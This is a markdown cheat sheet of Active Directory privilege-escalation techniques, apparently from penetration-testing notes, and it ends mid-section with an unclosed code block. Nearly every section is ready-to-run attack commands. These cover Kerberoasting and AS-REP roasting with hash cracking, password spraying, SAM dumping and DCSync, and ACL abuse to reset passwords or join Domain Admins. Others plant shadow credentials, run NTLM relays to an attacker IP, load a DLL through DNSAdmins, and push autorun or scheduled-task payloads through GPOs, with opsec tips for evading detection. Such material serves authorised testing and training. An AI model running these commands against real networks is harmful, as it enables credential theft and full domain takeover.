# Domain Privilege escalation
* [Relaying & Poisoning](relaying.md)
* [Password not required](#Password-not-required)
* [Password in description](#Password-in-description)
* [Password in shares](#Shares)
* [Reuse local admin password](#Reuse-local-admin-password)
* [Password spraying](#Password-spraying)
* [Kerberoast](#Kerberoast) 
  * [Set SPN](#Set-SPN)
* [AS-REP Roasting](#AS-REP-Roasting)
* [High Privileged Groups](#High-Privileged-Groups)
  * [Backup Operators](#Backup-Operators)
  * [Account Operators](#Account-Operators)
  * [DNS Admins](#DNS-Admins)
  * [Schema Admins](#Schema-Admins)
  * [Computers with high privileges](#Computers-with-high-privileges)
* [Access Control List(ACL)](#Access-Control-List)
  * [Check specific ACL permissions](#Specific-ACL-permissions)
  * [ACL-abuses](#ACL-abuses)
    * [Permissions on a User](#Permissions-on-a-user)
    * [Permissions on a Group](#Permissions-on-a-group)
    * [Permissions on a ComputerObject](#Permissions-on-a-ComputerObject)
    * [Permissions on Domain Object](#Permissions-on-Domain-Object)
    * [Permissions on a OU](#Permissions-on-OU)
    * [Writeowner of an object](#Writeowner-of-an-object---Change-the-owner)
    * [Owner of an object](#Owner-of-an-object---Add-GenericAll)
    * [ReadGMSAPassword](#ReadGMSAPassword)
      * [Relaying ReadGMSAPassword](#Relaying-ReadGMSAPassword) 
    * [NTLMRelay](#NTLMRelay)
    * [GPO Abuse](#GPO-Abuse)
* [Delegation](#Delegation) 
  * [Unconstrained Delegation](#Unconstrained-delegation)
    * [Unconstrained delegation computer](#Unconstrained-delegation-computer)
      * [Printer Bug](#Printer-bug)
    * [Unconstrained delegation User](#Unconstrained-delegation-User)
  * [Constrained Delegation](#Constrained-delegation) 
    * [Constrained delegation User](#Constrained-delegation-User)
    * [Constrained delegation Computer](#Constrained-delegation-Computer)
  * [Resource Based Constrained Delegation](#Resource-Based-Constrained-Delegation)
    * [Webclient Attack](#Webclient-Attack)
    * [Computer object takeover](#Computer-object-Takeover) 
    * [Change-Lockscreen](#Change-Lockscreen)
* [Local Administrator Password Solution(LAPS)](#LAPS)
* [MS Exchange](#MS-Exchange) 
  * [Attacking externally](#Attacking-externally)
  * [Attacking from the inside](#Attacking-from-the-inside)
  * [MS Exchange escalating privileges](#MS-Exchange-escalating-privileges)
  * [NTLM Relay MS Exchange abuse](#NTLM-Relay-MS-Exchange-abuse)
* [Active Directory Certificate Services](#Active-Directory-Certificate-Services)
  * [Enumeration](#Enumeration)
  * [Local privesc CertPotato](#Local-privesc-CertPotato)
  * [Privilege Escalation](#Privilege-Escalation)
    * [ESC1 Request SAN of other user](#ESC1-Request-SAN-of-other-user)
    * [ESC2 Modifiable SAN](#ESC2-Modifiable-SAN)
    * [ESC3 Agent certificate & Enroll on behalf of other user](#ESC3-Agent-certificate-&-Enroll-on-behalf-of-other-user)
    * [ESC4 Template ACEs](#ESC4-Template-ACEs)
    * [ESC5 Vulnerable PKI Object ACEs](#ESC5-Vulnerable-PKI-Object-ACEs)
    * [ESC7 Vulnerable CA ACL](#ESC7-Vulnerable-CA-ACL)
    * [ESC8 NTLM Relay to AD CS HTTP(S) Endpoints](#ESC8-NTLM-Relay-to-AD-CS-HTTP(S)-Endpoints)
    * [ESC11 NTLM Relay to AD CS ICPR Endpoints](#ESC11-NTLM-Relay-to-AD-CS-ICPR-Endpoints)
* [SQL Server](#SQL-Server)
  * [Locating and accessing SQL Servers](#Locating-and-accessing-SQL-Servers)
  * [Initial foothold](#Initial-foothold)
  * [Privilege Escalation to sysadmin](#Privilege-Escalation-to-sysadmin)
   	* [SQL Server enumerate login](#SQL-Server-enumerate-login)
   	* [Impersonation attack](#Impersonation-attack)
   	* [Create Stored procedure as DB_Owner](#Create-Stored-procedure-as-DB_Owner)
  * [Command execution](#Command-execution)
  * [Database links](#Database-links)
  * [Data exfiltration](#Data-exfiltration)
  * [SQL Queries](#SQL-Queries)
* [Windows Server Update Services WSUS](#WSUS)
* [Microsoft System Center Configuration Manager SCCM](#SCCM)
	* [Enumeration](#Enumeration)
	* [Privilege Escalation](#Privilege-Escalation)
		* [Operating System Deployment](#Operating-System-Deployment)
		* [Network Access Account](#Network-Access-Account)
		* [Client Push Installation Accounts](#Client-Push-Installation-Accounts)
		* [SCCM Compromise via Machine account relay to MSSQL](#SCCM-Compromise-via-Machine-account-relay-to-MSSQL)
		* [SCCM Compromise via Machine account relay to SMB](#SCCM-Compromise-via-Machine-account-relay-to-SMB)
	* [Lateral Movement](#Lateral-Movement)
		* [Push application](#Push-application)
		* [Push script](#Push-script)
	* [Misc](#Misc)
* [Active Directory Federation Services](#ADFS)
* [Pre Windows 2000 Computers](#Pre-Windows-2000-Computers)
* [Azure AD](#Azure-AD)
* [Child to Parent](#Child-to-Parent)
  * [Kerberos](#Kerberos)
  * [SQL Server](#SQL-Server)
  * [Trust key](#Trust-key)
  * [Krbtgt hash](#Krbtgt-hash)
* [Cross Forest attacks](#Cross-forest-attacks)
  * [Kerberos](#Kerberos)
  * [SQL Server](#SQL-Server)
  * [One-way Outbound](#One-way-Outbound)
  * [Printer Bug](#Printer-bug2) 
  * [Trust key](#Trust-key2) 
  * [Foreign Security Principals](#Foreign-Security-Principals)
  * [Pam Trust](#Pam-Trust)
  * [RDPInception](#RDPInception)

## Password not required
#### Check for users with password not required attribute
- These users are able to have an empty password
```
Get-DomainUser | Where-Object useraccountcontrol -Match PASSWD_NOTREQD | Select-Object samaccountname, useraccountcontrol
```

#### Check if user has empty password
- Or use powershell runas through RDP!
```
crackmapexec smb <DC IP> -u <USER> -p ''
```

## Password in description
#### Check for passwords in the description
```
Get-DomainUser | Where-Object -Property Description | Select-Object samaccountname, description
```

## Shares
- Mainly looking for credentials, for example Deploymentshare has creds most of the times

#### Enumerate shares with PowerView
```
Find-DomainShare -CheckShareAccess

Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*
```

#### Crackmapexec
```
cme smb <HOST FILE> -u <USER> -p <PASSWORD> --shares
```

## Reuse local admin password
#### Dump sam database
- Requires local admin access
```
crackmapexec smb <HOST> -u <USER> -p <PASSWORD> -d <DOMAIN> --sam
```

#### Reuse local administrator password against all other hosts
```
crackmapexec smb hosts.txt -u administrator -H <HASH> -d .
```

## Password spraying
#### Retrieve a list of usernames
```
crackmapexec ldap <DC FQDN> -u <USER> -p <PASSWORD> --users
```

```
Get-DomainUser | Select-Object -expandproperty samaccountname
```

#### Retrieve the current password policy
```
crackmapexec smb -u <USER> -p <PASSWORD> --pass-pol
```

```
Get-DomainPolicyData
```

### Spraying
#### SMB
- Spray easy guessable passwords against all these users
- Make sure to keep enough login attempts for the user!
- https://github.com/Greenwolf/Spray
```
crackmapexec smb <DC IP> -u <USER FILE> -p <PASSWORD FILE> --continue-on-success
```

```
spray.sh -smb <DC IP> <USER FILE> <PASSWORD FILE> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```

#### Reset password remotely
- Usefull for when the password is expired or set to MUST CHANGE
- [Link](Post-Exploitation.md#resetting-a-password-remotely)

## Kerberoast
- https://github.com/GhostPack/Rubeus
#### Find user accounts used as service accounts
```
Get-DomainUser -SPN
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
```

```
Rubeus.exe kerberoast /stats
```

```
.\ADSearch.exe --search "(&(sAMAccountType=805306368)(servicePrincipalName=*))"
```

#### Reguest a TGS
- OPSEC: Watch out for honeypot accounts, Generates Event 4769, Kerberoast specific users only!
```
./Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple /outfile:kerberoast_hashes.txt

./Rubeus.exe kerberoast /rc4opsec /user:<SERVICEACCOUNT> /domain:<DOMAIN> /outfile:kerberoast_hashes.txt
```

```
Invoke-Kerberoast -Outputformat hashcat
```

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>@<FQDN>"
```

#### Export ticket using Mimikatz
```
Invoke-Mimikatz -Command '"Kerberos::list /export"'
```

#### Crack the ticket
- Crack the password for the serviceaccount
```
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\ticket.kirbi
```

```
.\hashcat.exe -m 13100 -a 0 <HASH FILE> <WORDLIST>
```

```
.\John.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt hashes.txt
```

### Set SPN
- If we have sufficient permissions (GenericAll/GenericWrite). It is possible to set a SPN and then kerberoast!
#### Enumerate permissions
```
Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN>
Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectDN, ActiveDirectoryRights, IdentityreferenceName
```

#### Set SPN for the user
- Must be unique accross the forest. 
- Format ```<STRING>/<STRING>```
```
. ./PowerView_dev.ps1
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='<ops/whatever1>'}
```

#### Then Kerberoast user

## AS-REP Roasting
#### Enumerating accounts with kerberos preauth disabled
```
Get-DomainUser -PreauthNotRequired -verbose | select samaccountname
```

```
./ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
```

#### Request encrypted AS-REP with rubeus
- OPSEC: Watch out for honeypot accounts, Generates Event 4768 with RC4 encryption and a preauth type of 0, AS-REP roast specific users only!
```
.\rubeus.exe asreproast /format:hashcat
.\rubeus.exe asreproast /format:hashcat /user:<USER>
```

```
. ./ASREPRoast.ps1
Get-ASREPHash -Username <username> -Verbose
```

```
Invoke-ASREPRoast -Verbose | fl
```

#### Crack the hash with hashcat
```Edit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......```
```
Hashcat -a 0 -m 18200 hash.txt rockyou.txt
```

### Set pre-auth not required
- With enough rights (GenericWrite of GenericAll) it is possible to set pre-auth not required.

#### Enumerate permissions
```
Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN>
Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectDN, ActiveDirectoryRights, IdentityreferenceName
```

#### Set preauth not required
```
. ./PowerView_dev.ps1
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

## High Privileged Groups
- Default `Administrators`, `Domain Admins` and `Enterprise Admins` "super" groups.
- `Server Operators`, Members are allowed to log onto DCs locally and can modify services, access SMB shares, and backup files.
- `Backup Operators`, Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.
- `Print Operators`,	Members are allowed to logon to DCs locally and "trick" Windows into loading a malicious driver.
- `Hyper-V Administrators`, If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.
- `Account Operators`,	Members can modify non-protected accounts and groups in the domain.
- `Remote Desktop Users`,	Members are not given any useful permissions by default but are often granted additional rights such as Allow Login Through Remote Desktop Services and can move laterally using the RDP protocol.
- `Remote Management Users`,	Members are allowed to logon to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs).
- `Group Policy Creator Owners`,	Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.
- `Schema Admins`,	Members can modify the Active Directory schema structure and can backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.
- `DNS Admins`,	Members have the ability to load a DLL on a DC but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to create a WPAD record.
- `Enterprise Key Admins`, Members have the ability to write to the “msds-KeyCredentialLink” property on a user or computer. Writing to this property allows an attacker to create “Shadow Credentials” on the object and authenticate as the principal using kerberos PKINIT.
- https://cube0x0.github.io/Pocing-Beyond-DA/

### Backup Operators
- Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files. 
- Backup Operators also can log on to and shut down the computer. 
- They also have the permissions needed to replace files (including operating system files) on domain controllers.

#### Get members of the backup operators group
```
Get-DomainGroupMember "Backup Operators" | Select-Object Membername
```

### BackupOperatorToDa.exe
#### Host a public SMB share
```
python3 /opt/impacket/examples/smbserver.py share <DIRECTORY FOR SHARE> -smb2support
```

#### Retrieve SAM, SYSTEM, and SECURITY HIVE
- Run it as the "Backup Operator" user
- https://github.com/mpgn/BackupOperatorToDA
```
.\BackupOperatorToDA.exe -t \\<DC FQDN> -u <USER> -p <PASSWORD> -d <DOMAIN> -o \\<IP>\<SHARE>\
```

#### Run secretsdump.py to extract machine account hash
```
secretsdump.py LOCAL -system <DIRECTORY FOR SHARE>/SYSTEM -security <DIRECTORY FOR SHARE>/SECURITY -sam <DIRECTORY FOR SHARE>/SAM
````

#### Run DCSync with the computer account hash
```
secretsdump.py '<DOMAIN>/<DC COMPUTERACCONT NAME>$'@<DC FQDN> -hashes <LM HASH>:<NTLM HASH>
```

### GptTmpl.inf
- Requires to be run from high priv shell on machine within the domain, as the context of the backup operator account.

#### Download GptTmpl.inf
- Downloads to `C:\users\public\GptTmpl.inf`
```
robocopy "\\<FQDN DC>\sysvol\<DOMAIN>\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit" "C:\users\public"  GptTmpl.inf /b
```

#### Get user sid
- This sid wil get added to the local admins group
```
Get-DomainUser | Select-Object samaccountname, objectsid
```

#### Edit GptTmpl.inf
- Add the following inbetween `[Version]` and `[Privilege Rights]`
```
[Group Membership]
*<SID>__Memberof = *S-1-5-32-544
*<SID>__Members =
```

Example:
```
...snip...
[Version]
signature="$CHICAGO$"
Revision=1
[Group Membership]
*S-1-5-21-997099906-443949041-4154774969-1121__Memberof = *S-1-5-32-544
*S-1-5-21-997099906-443949041-4154774969-1121__Members =
[Privilege Rights]
...snip...
```

#### Upload GptTmpl.inf
```
robocopy "C:\users\public" "\\<FQDN DC>\sysvol\<DOMAIN>\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit" GptTmpl.inf /b
```

#### Wait for gpupdate
```
gpupdate /force
```



### Account Operators
The group grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including those of users, local groups, and global groups, and members can log in locally to domain controllers. By default it has no direct path to Domain Admin, but these groups might be able to add members to other groups which have other ACL's etc.

Paths to domain admins can be created if Exchange is installed for example since the Account Operator group can manage Exchange groups which have high privileges to the domain object. If they are created high privileged groups within the domain, there is a big chance that there is a path to gain access to other machines or domain admins using this group!

### DNS Admins
#### Enumerate member of the DNS admin group
```
Get-DomainGroupMember "DNSAdmins"
```

#### From the privilege of DNSAdmins group member, configue DDL using dnscmd.exe (needs RSAT DNS)
Share the directory the ddl is in for everyone so its accessible.
logs all DNS queries on C:\Windows\System32\kiwidns.log 
```
dnscmd <dns server> /config /serverlevelplugindll \\<ip>\dll\mimilib.dll
```

#### Restart DNS
```
sc \\<dns server> stop dns
sc \\<dns server> start dns
```

### Schema Admins
- Use the ADModule not Powerview!

#### Get User SID
- This user will have privileges for new objects
```
Get-ADUser <USER> -Properties * | Select-Object Samaccountname, Objectsid
```

### Modify schema - group
- Using the `SID` of previous command
- This will give us full control over the groups that are created **after** the modification.
- Use the ADModule not Powerview!
```
Set-ADObject -Identity "CN=group,CN=Schema,CN=Configuration,DC=<DOMAIN>,DC=local" -Replace @{defaultSecurityDescriptor = 'D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;<SID>)';} -Verbose
```

#### Check new groups
```
Get-ADGroup -Properties * | Select-Object samaccountname, whencreated | Sort-Object whencreated
```

#### Check if user has ACL of new group
- With PowerView
```
Get-DomainGroup <GROUP> | Get-DomainObjectAcl | ? {$_.SecurityIdentifier -eq "<SID USER>"}
```

#### Add members to new group
```
Add-ADGroupMember <GROUP> -Members <USER>
```

### Modify schema - GPO
```
Set-ADObject -Identity "CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=<DOMAIN>,DC=local" -Replace @{defaultSecurityDescriptor = 'D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;<SID>)';} -Verbose
```

#### Add local admin abuse
- https://github.com/FSecureLABS/SharpGPOAbuse
```
./ShapGPOAbuse.exe --AddLocalAdmin --GPOName <GPONAME> --UserAccount <USERNAME>
gpupdate /force #On the target machine if you got normal access already
net localgroup administrators
```

#### Create scheduled task
- https://github.com/FSecureLABS/SharpGPOAbuse
```
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c <SHARE>\<EXECUTABLE FILE>" --GPOName "<GPO>"
```

### Computers with high privileges
- Computerobjects part of a high privileged group have the same permissions as users part of the group.
- Might be able to Relay the privileges of the computeraccount in combination with the printerbug!

#### Enumerate computers part of high privileged groups
```
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse -ErrorAction Silentlycontinue -WarningAction Silentlycontinue | Where-Object -Property MemberObjectClass -Match computer | Select-Object MemberName
```

## Access Control List
- It is possible to abuse permissions (ACL's)
- `ObjectDN` = The object the permissions apply to
- `ActiveDirectoryRight` == Permissions
- `IdentityReferenceName` == Object who has the permissions
- Edge cases https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html

#### Scan for ACL permissions
```
Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN>
Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectDN, ActiveDirectoryRights, IdentityreferenceName
```
- Check every owned user in bloodhoud

#### Aclight2 scan
- https://github.com/cyberark/ACLight
```
Import-Module ACLight2.psm1
Start-ACLAnalysis
```

### Specific ACL permissions
#### Scan for specific ACL permissions the user has
```
Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectDN, ActiveDirectoryRights, IdentityreferenceName | Where-Object -Property IdentityreferenceName -Match <USERNAME>

Get-DomainObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "<SID>"} | select-object ObjectDN, ObjectAceType
```

#### Scan for all ACL permissions of the user has on another specific object
- First get the SID of the user you want to check if he has permissions on target user
```
Get-Domainuser <USERNAME> | Select-Object samaccountname, objectsid
Get-DomainObjectAcl -SamAccountName <TARGET USER> -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "<SID>"}
```

### ACL abuses
- In case you have a GenericAll permission on a user, you can:
  - Set a SPN on behalf of that user and crack it (stealthy method)
  - Change his password and log in as that user (not stealthy but immediate access is given)
- Force-ChangePassword privilege can also allow you to change the password of a user
- In case you have a GenericAll permission on a Group, Write permission, Write-Owner permission or Self permission, you can
  - Add yourself to this group, and as a result obtain the privileges that this group possesses.
- In case you have WriteOwner permissions you can add a owner to the object.

### Permissions on a user
#### Generic all / Force Change Password / AllExtendedRights - Reset password of a user
```
net user <USERNAME> <PASSWORD> /domain

$UserPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
Set-DomainUserPassword -Identity <USERNAME> -AccountPassword $UserPassword
```

#### Generic write - Set SPN for user
- For example service ```HTTP/jumpbox```
- Then kerberoast the user [Kerberoast](#Kerberoast) 
- Execute command again to revert it
```
Set-DomainObject -Identity <USERNAME> -Set @{serviceprincipalname='<SERVICE>/<SPN>1'}
```

#### Generic write - Add preauthnotreq flag
- Then as-repreoast the user [AS-REP Roasting](#AS-REP-Roasting) 
- Execute command again to revert it
```
Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304} -Verbose
```

#### Write owner - Change owner and give generic all
- Use ```Remove-ObjectAcl``` and ```Set-DomainObjectOwner``` again to remove the ACL's
```
Set-DomainObjectOwner -Identity <TARGET> -OwnerIdentity <NEW OWNER> -Verbose
Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <USER> -Rights All -Verbose

# Check who is owner 
Get-DomainObject -Identity <TARGET> -SecurityMasks Owner | select samaccountname, Owner
Get-DomainObject -Identity <SID>

# Check new rights - First get the SID of the user you want to check if he has permissions on target user
Get-Domainuser <USERNAME>
Get-DomainObjectAcl -SamAccountName <TARGET USER> -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "<SID>"}
```

### Permissions on a group
- GenericAll permission on a Group, Write permission, Write-Owner permission GenericWrite or Self permission

#### Add user to a group 
```
Add-DomainGroupMember -Identity "<GROUP>" -Members <USER> -Verbose
net group "Domain Admins" analyst1 /domain /add
```

### Permissions on a ComputerObject
#### Write owner - Change owner and give generic all
- Use ```Remove-ObjectAcl``` and ```Set-DomainObjectOwner``` again to remove the ACL's
```
Set-DomainObjectOwner -Identity <TARGET> -OwnerIdentity <NEW OWNER> -Verbose
Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <USER> -Rights All -Verbose

# Check who is owner 
Get-DomainObject -Identity <TARGET> -SecurityMasks Owner | select samaccountname, Owner
Get-DomainObject -Identity <SID>

# Check new rights - First get the SID of the user you want to check if he has permissions on target user
Get-Domainuser <USERNAME>
Get-DomainObjectAcl -SamAccountName <TARGET USER> -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "<SID>"}
```

#### GenericWrite - Computer object takeover
See [Computer object takeover](#Computer-object-Takeover) 

#### GenericAll - Read LAPS password
```
Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <USER> -Rights All -Verbose
Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samaccountname, ms-mcs-admpwd
```

### GenericWrite - Shadow Credentials
- Write Key Credentials to the `msDS-KeyCredentialLink` attribute. Request TGT and Extract NTLM hash.
- Possible to use for persistence since password change doesn't affect the attribute

### Windows
#### Add shadow credentials
- https://github.com/eladshamir/Whisker
```
.\Whisker.exe add /target:<TARGET OBJECT> /domain:<FQDN DOMAIN> /dc:<FQDN DC> /path:'shadow.pfx' /password:<PASSWORD>
```

#### List credential object
```
.\Whisker.exe list /target:<TARGET OBJECT> /domain:<FQDN DOMAIN> /dc:<FQDN DC>
```

#### Run the printed Rubeus command and retrieve NTLM hash
```
Rubeus.exe asktgt /user:.... /certificate:..... /....
```

#### Perform S4USelf attack to gain TGS ticket
- Possible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM
- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right.
- Make sure they are local admin on the target machine.
```
.\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs/<FQDN COMPUTER> /dc:<FQDN DC> /ticket:<TICKET BASE64> /ptt
```

- Or use the NTLM (Not opsec safe)

```
.\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs/<FQDN COMPUTER> /dc:<FQDN DC> /user:'<COMPUTERACCOUNT>$' /rc4:<NTLM> /ptt

.\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:http/<FQDN COMPUTER> /dc:<FQDN DC> /user:'<COMPUTERACCOUNT>$' /rc4:<NTLM> /ptt
```

#### Check access
```
dir \\<TARGET FQDN>\c$
winrs -r:<TARGET FQDN> whoami
```

#### Cleanup
```
.\Whisker.exe remove /target:<TARGET OBJECT> /domain:<FQDN DOMAIN> /dc:<FQDN DC> /deviceid:<DEVICE ID>
```

### Linux
- Possible to use python version of whisker https://github.com/ShutdownRepo/pywhisker
#### Add shadow credentials and retrieve NTLM & .ccache
```
certipy shadow auto -k -no-pass -dc-ip <DC IP> -account <SAMACCOUNTNAME OBJECT> -target <FQDN DC> -debug
```

#### Add shadow credentials Relay
```
ntlmrelayx.py -t ldap://<FQDN DC> --shadow-credentials --shadow-target '<SAMACCOUNTNAME OBJECT>'

python3 Coercer.py coerce -l cb-ws.certbulk.cb.corp -t cb-store.certbulk.cb.corp -u studentx -p 'IamtheF!rstStud3nt#' -d certbulk.cb.corp -v --filter-method-name "EfsRpcDuplicateEncryptionInfoFile"
```

### Permissions on Domain Object
#### Writedacl - Add permissions for dcsync
- Use ```Remove-ObjectAcl``` to remove the ACL's
```
Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -PrincipalIdentity '<USER>' -Rights DCSync -Verbose

#After impersonating the user with these permissions the above didn't work, but this did:
Add-ObjectAcl -PrincipalIdentity exch_adm -Rights DCSync
```

#### GenericAll - Dcsync
- Execute DC Sync

### Permissions on OU
#### Generic all - Inherit down
- The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. 

#### Fetch guids for all objects
```
$Guids = Get-DomainGUIDMap
$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name
```

#### Grant user full control of all descendant objects:
```
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity '<USER>' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid
```

#### Apply this ACE to our target OU:
```
$OU = Get-DomainOU -Raw <GUID>
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()
```

#### If laps is enabled, read password
```
Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samaccountname, ms-mcs-admpwd
```

### Writeowner of an object - Change the owner
- When writeowner
```
Set-DomainObjectOwner -Credential $creds -Identity <OBJECT FQDN OR SID> -OwnerIdentity <NEW OWNER>

Get-DomainObjectAcl -Identity <IDENTITY> -ResolveGUIDs | Where-Object -Property SecurityIdentifier -Match <SID NEW OWNER>
```

### Owner of an object - Add GenericAll
```
Add-DomainObjectAcl -Credential $creds -TargetIdentity "<OBJECT FQDN OR SID>" -Rights all -PrincipalIdentity <USER WHO GETS GENERIC ALL> -Verbose

Get-DomainObjectAcl -Identity "<OBJECT FQDN OR SID>" -ResolveGUIDs | Where-Object -Property SecurityIdentifier -Match <SID OF USER WHO GETS GENERIC ALL>
```

### ReadGMSAPassword
- https://github.com/rvazarkar/GMSAPasswordReader

#### Read GMSA password
```
.\gmsapasswordreader.exe --accountname <ACCOUNT>
```

### Relaying ReadGMSAPassword
#### Check LDAPS Binding
- https://github.com/zyn3rgy/LdapRelayScan
```
python3 LdapRelayScan.py -method BOTH -dc-ip <IP> -u <USER> -p <PASSWORD>

cme ldap <DC IP> -u <USER> -p <PASSWORD> -M ldap-checker
```

#### Start NTLMRelay
- Requires ldaps
```
sudo python3 ntlmrelayx.py -t ldaps://<DC> --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs --http-port 8080
```

#### Force auth
- [Change lockscreen image](#Change-lockscreen-image)
- [Coercing](#Trigger-target-to-authenticate-to-attacker-machine)

```
Invoke-WebRequest http://<ATTACKER IP>:8080 -UseDefaultCredentials
```

### NTLMRelay
- It is possible to abuse ACL with NTLMRelay abuse

```
ntlmrelayx.py -t ldap://<DC IP> --escalate-user <USER>
```

#### Restore ACL's with aclpwn.py
- NTLMRelayx performs acl attacks a restore file is sived that can be used to restore the ACL's
```
python3 aclpwn.py --restore aclpwn.restore
```

### GPO Abuse
- Members of ```Group Policy Creator Owners``` can create new GPO's. But they cant link it to anything or modify existing GPO’s. The creator will have to modify rights over created GPO.

#### Show who can create new GPO's
```
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=<DOMAIN>,DC=<DOMAIN>" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```

#### Show who can write to GP-link attribute on OUs
```
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
```

#### Show who can edit GPO's with 4 digit RID
- Has WriteProperty, WriteDACL or WriteOwner
```
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "<DOMAIN SID>-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```

#### Resolve sid + Object dn
```
ConvertFrom-SID <SID>
Get-DomainGPO -Name "{<OBJECT DN SID>}" -Properties DisplayName
```

#### Create GPO and link to OU
- Uses RSAT tools or https://github.com/Dliv3/SharpGPO
```
New-GPO -Name "SMB security" | New-GPLink -Target "OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>"

SharpGpo.exe --Action NewGPO --GPOName SMB security
SharpGpo.exe --Action NewGPLink --DN "OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>" --GPOName SMB security
```

### Abuses
#### Set autorun value
- Uses RSAT tools
- Best is to set the executable on a share in the domain
```
Set-GPPrefRegistryValue -Name "Testing GPO SMB security" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\<HOSTNAME>\<SHARE>\pivot.exe" -Type ExpandString
```

#### Add local admin abuse
- https://github.com/FSecureLABS/SharpGPOAbuse
```
./ShapGPOAbuse.exe --AddLocalAdmin --GPOName <GPONAME> --UserAccount <USERNAME>
gpupdate /force #On the target machine if you got normal access already
net localgroup administrators
```

#### Create scheduled task
- https://github.com/FSecureLABS/SharpGPOAbuse
```
